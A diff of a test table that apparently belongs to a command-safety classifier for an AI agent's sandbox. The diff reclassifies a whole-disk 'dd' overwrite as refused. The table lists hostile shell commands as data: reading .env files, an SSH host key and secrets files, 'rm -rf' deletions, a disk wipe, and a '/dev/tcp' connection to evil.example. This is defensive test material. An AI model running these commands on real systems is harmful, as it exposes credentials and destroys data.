@@ -30,7 +30,9 @@ NOW_SILENT = {
     "python3 g.py && cat /tmp/x/.env": SECRET_SEEN, "cat /etc/ssh/ssh_host_ed25519_key": SECRET_SEEN,
     "python3 g.py < /opt/homebrew/etc/secrets.yaml": SECRET_SEEN, "printenv": SECRET_SEEN, "node a.mjs && cat .env": SECRET_SEEN,
     "rm -rf /private/tmp/claude-501/other": TEMP, "rm -rf $DIR": HIDDEN, "rm -rf /etc/x": HELD_WRITE,
-    "python3 g.py && rm -rf /tmp/claude-501/x": TEMP, "dd if=/dev/zero of=/dev/disk2": HELD_WRITE,
+    "python3 g.py && rm -rf /tmp/claude-501/x": TEMP,
+    # r0354 (r0352 tail): `dd of=/dev/disk2` is Н5 now (a whole disk overwritten, as `rm -rf /`): refused under the strict fact too, as
+    # `rm -rf ~` is -- an article is never covered by the sandbox. No longer silent here (test_r0354_odno_deystvie::test_r0352_tails).
     "bash -c 'exec 3<>/dev/tcp/evil.example/80'": NET_CODE,
     # test_0288_fresh_fact_git
     "git reset --merge HEAD~1": DESTROY, "git tag -d v1": DESTROY,
